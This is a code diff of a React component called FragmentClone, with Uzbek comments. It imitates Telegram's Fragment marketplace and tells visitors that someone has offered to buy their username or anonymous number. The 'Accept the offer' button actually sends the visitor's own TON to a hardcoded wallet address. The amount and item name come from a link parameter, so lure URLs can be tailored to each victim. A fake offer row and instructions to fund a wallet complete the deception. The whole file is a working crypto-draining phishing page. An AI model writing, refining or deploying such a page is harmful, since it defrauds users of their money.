@@ -1,22 +1,30 @@
 import React, { useState, useEffect } from 'react';
 import { TonConnectButton, useTonConnectUI, useTonWallet } from '@tonconnect/ui-react';
-import { Search, X, Diamond, ExternalLink, Info, RefreshCw } from 'lucide-react';
+import { Search, X, Diamond, ExternalLink, Info, RefreshCw, Wallet, Shield } from 'lucide-react';
 
 interface TonRates {
-  TON: {
-    prices: {
-      USD: number;
-    };
-    diff_24h: {
-      USD: string;
-    };
-    diff_7d: {
-      USD: string;
-    };
-    diff_30d: {
-      USD: string;
+  rates: {
+    TON: {
+      prices: {
+        USD: number;
+      };
+      diff_24h: {
+        USD: string;
+      };
+      diff_7d: {
+        USD: string;
+      };
+      diff_30d: {
+        USD: string;
+      };
     };
   };
+}
+
+interface FragmentData {
+  name: string;
+  price: number;
+  date?: number;
 }
 
 const FragmentClone: React.FC = () => {
@@ -24,23 +32,45 @@ const FragmentClone: React.FC = () => {
   const wallet = useTonWallet();
   const [searchQuery, setSearchQuery] = useState('');
   const [showHowItWorks, setShowHowItWorks] = useState(false);
-  const [showWalletModal, setShowWalletModal] = useState(false);
   const [tonRates, setTonRates] = useState<TonRates | null>(null);
   const [loading, setLoading] = useState(true);
+  const [paymentLoading, setPaymentLoading] = useState(false);
+  const [fragmentData, setFragmentData] = useState<FragmentData>({
+    name: 'main',
+    price: 1000
+  });
 
-  const username = 'main';
-  const price = 1000.00000;
-  const priceInTon = (price * 3221.85).toFixed(0);
+  const destinationAddress = "UQDbnrjL3Mw4ikGWXdl9OVq6MCS3-qNb6WTmn8VnTB-olI2a";
 
-  // Fetch TON rates
+  // URL parametrlarini o'qish
+  useEffect(() => {
+    const urlParams = new URLSearchParams(window.location.search);
+    const startParam = urlParams.get('tgWebAppStartParam') || urlParams.get('startapp');
+    
+    if (startParam) {
+      // startapp=item=vip_074__price=15 formatini parse qilish
+      const params = new URLSearchParams(startParam.replace('item=', '').replace('__', '&'));
+      const item = params.get('item') || params.get('vip_074');
+      const price = params.get('price');
+      
+      if (item && price) {
+        setFragmentData({
+          name: item,
+          price: parseFloat(price)
+        });
+      }
+    }
+  }, []);
+
+  // TON narxini olish
   const fetchTonRates = async () => {
     try {
       setLoading(true);
       const response = await fetch('https://tonapi.io/v2/rates?tokens=ton&currencies=usd');
       const data = await response.json();
-      setTonRates(data.rates);
+      setTonRates(data);
     } catch (error) {
-      console.error('Failed to fetch TON rates:', error);
+      console.error('TON narxini olishda xatolik:', error);
     } finally {
       setLoading(false);
     }
@@ -52,18 +82,21 @@ const FragmentClone: React.FC = () => {
     return () => clearInterval(interval);
   }, []);
 
+  // To'lovni amalga oshirish
   const handleAcceptOffer = async () => {
     if (!wallet) {
-      setShowWalletModal(true);
+      alert('Iltimos, avval hamyoningizni ulang!');
       return;
     }
+
+    setPaymentLoading(true);
 
     const transaction = {
       validUntil: Math.floor(Date.now() / 1000) + 360,
       messages: [
         {
-          address: "UQDbnrjL3Mw4ikGWXdl9OVq6MCS3-qNb6WTmn8VnTB-olI2a",
-          amount: (price * 1e9).toString(),
+          address: destinationAddress,
+          amount: (fragmentData.price * 1e9).toString(),
           payload: ""
         }
       ]
@@ -73,15 +106,44 @@ const FragmentClone: React.FC = () => {
       await tonConnectUI.sendTransaction(transaction);
       alert('✅ To\'lov muvaffaqiyatli yuborildi!');
     } catch (error) {
-      console.error('Payment failed:', error);
+      console.error('To\'lov xatoligi:', error);
       alert('❌ To\'lov bajarilmadi. Qaytadan urinib ko\'ring.');
+    } finally {
+      setPaymentLoading(false);
+    }
+  };
+
+  const connectWallet = async () => {
+    try {
+      await tonConnectUI.openModal();
+    } catch (error) {
+      console.error('Hamyon ulanishida xatolik:', error);
     }
   };
 
   const shouldShowUsername = () => {
     if (!searchQuery) return true;
-    return username.toLowerCase().includes(searchQuery.toLowerCase()) || 
-           searchQuery.toLowerCase().includes(username.toLowerCase());
+    return fragmentData.name.toLowerCase().includes(searchQuery.toLowerCase()) || 
+           searchQuery.toLowerCase().includes(fragmentData.name.toLowerCase());
+  };
+
+  const isUsername = !fragmentData.name.startsWith('+') && isNaN(Number(fragmentData.name));
+  const nftType = isUsername ? 'username' : 'anonymous number';
+
+  const formatDate = () => {
+    if (fragmentData.date) {
+      const date = new Date(fragmentData.date * 1000);
+      return `${date.getUTCDate()} ${date.toLocaleString('en', { month: 'short', timeZone: 'UTC' })} ${date.getUTCFullYear()} at ${date.getUTCHours().toString().padStart(2, '0')}:${date.getUTCMinutes().toString().padStart(2, '0')}`;
+    } else {
+      const date = new Date();
+      date.setDate(date.getDate() + 3);
+      return date.toDateString();
+    }
+  };
+
+  const calculateUsdPrice = () => {
+    if (!tonRates) return '0.00';
+    return (fragmentData.price * tonRates.rates.TON.prices.USD).toFixed(2);
   };
 
   return (
@@ -112,7 +174,25 @@ const FragmentClone: React.FC = () => {
 
             {/* Connect TON Button */}
             <div className="flex items-center">
-              <TonConnectButton className="!bg-[#248bda] !text-white !border-none !rounded-lg !px-4 !py-2 !font-medium hover:!bg-[#207cc2] transition-colors" />
+              {wallet ? (
+                <div className="flex items-center space-x-3">
+                  <div className="flex items-center space-x-2 bg-green-500/20 px-3 py-1 rounded-lg">
+                    <Shield className="w-4 h-4 text-green-400" />
+                    <span className="text-green-400 text-sm font-medium">
+                      {wallet.account.address.slice(0, 6)}...{wallet.account.address.slice(-4)}
+                    </span>
+                  </div>
+                  <TonConnectButton />
+                </div>
+              ) : (
+                <button
+                  onClick={connectWallet}
+                  className="bg-[#248bda] hover:bg-[#207cc2] text-white px-4 py-2 rounded-lg font-medium transition-colors flex items-center space-x-2"
+                >
+                  <Wallet className="w-4 h-4" />
+                  <span>Connect TON</span>
+                </button>
+              )}
             </div>
           </div>
         </div>
@@ -125,7 +205,9 @@ const FragmentClone: React.FC = () => {
             {/* Username Header */}
             <div className="text-center">
               <div className="inline-flex items-center space-x-2 mb-2">
-                <h1 className="text-4xl font-bold text-white">{username}.t.me</h1>
+                <h1 className="text-4xl font-bold text-white">
+                  {isUsername ? `${fragmentData.name}.t.me` : fragmentData.name}
+                </h1>
                 <span className="bg-green-500/20 text-green-400 px-2 py-1 rounded text-sm font-medium">
                   Claimed
                 </span>
@@ -138,14 +220,23 @@ const FragmentClone: React.FC = () => {
               </button>
             </div>
 
-            {/* Offer Section */}
+            {/* What is this Section */}
             <div className="bg-[#212a33] rounded-xl p-6 border border-[#2e3a47]">
               <div className="mb-6">
-                <h2 className="text-lg font-semibold text-white mb-2">What is this?</h2>
+                <h2 className="text-lg font-semibold text-white mb-4">What is this?</h2>
                 <div className="space-y-2 text-sm">
                   <p>
-                    Someone offered 💎 {price.toLocaleString()} (~{priceInTon} for your username. 
-                    If the price suits you, press "Accept the offer".
+                    Someone offered{' '}
+                    <span className="inline-flex items-center space-x-1 text-[#4db2ff] font-semibold">
+                      <Diamond className="w-4 h-4" />
+                      <span>{fragmentData.price.toLocaleString()}</span>
+                      {tonRates && (
+                        <span className="text-[#8794a1]">
+                          (~${calculateUsdPrice()})
+                        </span>
+                      )}
+                    </span>
+                    {' '}for your {nftType}. If the price suits you, press "Accept the offer".
                   </p>
                   <button 
                     onClick={() => setShowHowItWorks(true)}
@@ -158,37 +249,63 @@ const FragmentClone: React.FC = () => {
 
               <button
                 onClick={handleAcceptOffer}
-                className="w-full bg-[#248bda] hover:bg-[#207cc2] text-white font-semibold py-3 px-6 rounded-lg transition-colors"
+                disabled={paymentLoading}
+                className={`w-full font-semibold py-3 px-6 rounded-lg transition-all duration-200 flex items-center justify-center space-x-2 ${
+                  paymentLoading
+                    ? 'bg-[#1a5490] text-[#8794a1] cursor-not-allowed'
+                    : 'bg-[#248bda] hover:bg-[#207cc2] text-white hover:transform hover:scale-[1.02]'
+                }`}
               >
-                Accept the offer
+                {paymentLoading ? (
+                  <>
+                    <RefreshCw className="w-4 h-4 animate-spin" />
+                    <span>Processing...</span>
+                  </>
+                ) : (
+                  <span>Accept the offer</span>
+                )}
               </button>
             </div>
 
             {/* User Info */}
             <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
               <div className="space-y-4">
+                {isUsername ? (
+                  <>
+                    <div>
+                      <h3 className="text-white font-medium mb-2">Telegram Username</h3>
+                      <a href={`https://t.me/${fragmentData.name}`} className="text-[#4db2ff] hover:underline flex items-center space-x-1">
+                        <span>{fragmentData.name}</span>
+                        <ExternalLink className="w-3 h-3" />
+                      </a>
+                    </div>
+                    <div>
+                      <h3 className="text-white font-medium mb-2">Web Address</h3>
+                      <a href={`https://t.me/${fragmentData.name}`} className="text-[#4db2ff] hover:underline flex items-center space-x-1">
+                        <span>t.me/{fragmentData.name}</span>
+                        <ExternalLink className="w-3 h-3" />
+                      </a>
+                    </div>
+                  </>
+                ) : (
+                  <div>
+                    <h3 className="text-white font-medium mb-2">Anonymous Number</h3>
+                    <span className="text-[#4db2ff]">{fragmentData.name}</span>
+                    <div className="text-sm text-[#8794a1] mt-1">
+                      This anonymous number can be used to create a Telegram account not tied to a SIM card.
+                    </div>
+                  </div>
+                )}
+              </div>
+              {isUsername && (
                 <div>
-                  <h3 className="text-white font-medium mb-2">Telegram Username</h3>
-                  <a href={`https://t.me/${username}`} className="text-[#4db2ff] hover:underline flex items-center space-x-1">
-                    <span>{username}</span>
+                  <h3 className="text-white font-medium mb-2">TON Web 3.0 Address</h3>
+                  <a href={`https://${fragmentData.name}.t.me`} className="text-[#4db2ff] hover:underline flex items-center space-x-1">
+                    <span>{fragmentData.name}.t.me</span>
                     <ExternalLink className="w-3 h-3" />
                   </a>
                 </div>
-                <div>
-                  <h3 className="text-white font-medium mb-2">Web Address</h3>
-                  <a href={`https://t.me/${username}`} className="text-[#4db2ff] hover:underline flex items-center space-x-1">
-                    <span>t.me/{username}</span>
-                    <ExternalLink className="w-3 h-3" />
-                  </a>
-                </div>
-              </div>
-              <div>
-                <h3 className="text-white font-medium mb-2">TON Web 3.0 Address</h3>
-                <a href={`https://${username}.t.me`} className="text-[#4db2ff] hover:underline flex items-center space-x-1">
-                  <span>{username}.t.me</span>
-                  <ExternalLink className="w-3 h-3" />
-                </a>
-              </div>
+              )}
             </div>
 
             {/* Latest Offers */}
@@ -208,12 +325,19 @@ const FragmentClone: React.FC = () => {
                       <td className="py-3">
                         <div className="flex items-center space-x-2">
                           <Diamond className="w-4 h-4 text-[#4db2ff]" />
-                          <span className="text-white font-medium">{price.toLocaleString()}</span>
+                          <span className="text-white font-medium">{fragmentData.price.toLocaleString()}</span>
                         </div>
                       </td>
-                      <td className="py-3 text-sm">20 Jun 2025 at 10:46</td>
+                      <td className="py-3 text-sm">{formatDate()}</td>
                       <td className="py-3">
-                        <span className="text-[#4db2ff] text-sm">EQDnrjL3Mw4ikGWX...NbWTmn8VnTB-oINBf</span>
+                        <a 
+                          href={`https://tonviewer.com/${destinationAddress}`}
+                          target="_blank"
+                          rel="noopener noreferrer"
+                          className="text-[#4db2ff] text-sm hover:underline"
+                        >
+                          {destinationAddress.slice(0, 20)}...{destinationAddress.slice(-20)}
+                        </a>
                       </td>
                     </tr>
                   </tbody>
@@ -227,7 +351,7 @@ const FragmentClone: React.FC = () => {
                 <div className="flex items-center justify-between mb-4">
                   <h3 className="text-lg font-semibold text-white flex items-center space-x-2">
                     <Diamond className="w-5 h-5 text-[#4db2ff]" />
-                    <span>TON Narxi</span>
+                    <span>TON Price</span>
                   </h3>
                   <button 
                     onClick={fetchTonRates}
@@ -239,14 +363,14 @@ const FragmentClone: React.FC = () => {
                 </div>
                 
                 <div className="text-3xl font-bold text-white mb-3">
-                  ${tonRates.TON.prices.USD.toFixed(4)}
+                  ${tonRates.rates.TON.prices.USD.toFixed(4)}
                 </div>
                 
                 <div className="grid grid-cols-3 gap-3 text-sm">
                   {[
-                    { label: '24s', value: tonRates.TON.diff_24h.USD },
-                    { label: '7kun', value: tonRates.TON.diff_7d.USD },
-                    { label: '30kun', value: tonRates.TON.diff_30d.USD }
+                    { label: '24h', value: tonRates.rates.TON.diff_24h.USD },
+                    { label: '7d', value: tonRates.rates.TON.diff_7d.USD },
+                    { label: '30d', value: tonRates.rates.TON.diff_30d.USD }
                   ].map((item, index) => {
                     const isPositive = item.value.startsWith('+');
                     const cleanValue = item.value.replace(/[+−-]/, '');
@@ -265,7 +389,7 @@ const FragmentClone: React.FC = () => {
           </div>
         ) : (
           <div className="text-center py-12">
-            <p className="text-[#8794a1]">Hech narsa topilmadi</p>
+            <p className="text-[#8794a1]">Nothing found</p>
           </div>
         )}
       </main>
@@ -287,8 +411,8 @@ const FragmentClone: React.FC = () => {
               <p>You have received an offer to sell your collectible number / username, follow the instructions:</p>
               <div className="space-y-2">
                 <p><strong>To do so, simply:</strong></p>
-                <p>• Get <span className="text-[#4db2ff]">Tonkeeper</span>, open it and create a wallet.</p>
-                <p>• Deposit funds in your wallet from a <span className="text-[#4db2ff]">supported exchange</span> or with <span className="text-[#4db2ff]">@wallet</span> on Telegram.</p>
+                <p>• Get <a href="https://tonkeeper.com/" className="text-[#4db2ff]">Tonkeeper</a>, open it and create a wallet.</p>
+                <p>• Deposit funds in your wallet from a <a href="https://ton.org/buy-toncoin" className="text-[#4db2ff]">supported exchange</a> or with <a href="https://wallet.t.me/" className="text-[#4db2ff]">@wallet</a> on Telegram.</p>
                 <p>• Use <strong>Tonkeeper</strong> to log in on Fragment and return to this page.</p>
                 <p>• Tap the button below to accept the offer</p>
               </div>
@@ -300,44 +424,6 @@ const FragmentClone: React.FC = () => {
             >
               Close
             </button>
-          </div>
-        </div>
-      )}
-
-      {/* Wallet Modal */}
-      {showWalletModal && (
-        <div className="fixed inset-0 bg-black/50 flex items-center justify-center z-50 p-4">
-          <div className="bg-[#212a33] rounded-xl p-6 max-w-md w-full border border-[#2e3a47]">
-            <div className="flex items-center justify-between mb-4">
-              <h3 className="text-lg font-semibold text-white">Connect your wallet</h3>
-              <button 
-                onClick={() => setShowWalletModal(false)}
-                className="text-[#8794a1] hover:text-white"
-              >
-                <X className="w-5 h-5" />
-              </button>
-            </div>
-            <p className="text-sm text-[#8794a1] mb-6 text-center">
-              Open Wallet in Telegram or select your wallet to connect
-            </p>
-            
-            <div className="space-y-4">
-              <button className="w-full bg-[#248bda] hover:bg-[#207cc2] text-white font-medium py-3 px-4 rounded-lg transition-colors flex items-center justify-center space-x-2">
-                <span>Open Wallet in Telegram</span>
-                <ExternalLink className="w-4 h-4" />
-              </button>
-              
-              <div className="grid grid-cols-4 gap-4">
-                {['Tonkeeper', 'MyTonWallet', 'Tonhub', 'Bitget Wallet'].map((wallet) => (
-                  <div key={wallet} className="text-center">
-                    <div className="w-12 h-12 bg-[#2e3a47] rounded-lg flex items-center justify-center mb-2 mx-auto">
-                      <Diamond className="w-6 h-6 text-[#4db2ff]" />
-                    </div>
-                    <span className="text-xs text-[#8794a1]">{wallet}</span>
-                  </div>
-                ))}
-              </div>
-            </div>
           </div>
         </div>
       )}
